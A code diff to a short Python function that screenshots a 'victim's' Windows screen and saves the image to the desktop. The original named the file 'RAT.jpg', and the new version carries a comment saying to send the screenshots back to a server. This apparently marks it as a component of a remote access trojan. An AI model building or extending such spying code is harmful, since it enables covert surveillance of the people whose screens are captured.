@@ -1,9 +1,10 @@
-import pyautogui
 import os
+from os import path
+import pyautogui
 
-def victomscreenshot():
 
-
-      desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop\\')
-      victom_Screenshot = pyautogui.screenshot()
-      victom_Screenshot.save(desktop + "RAT.jpg")
+def screenshot(filenamesave):
+    victim = pyautogui.screenshot()
+    filenameformat = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop\\')
+    victim.save(filenameformat + filenamesave) 
+    # Please use this function to send screenshots back to server.
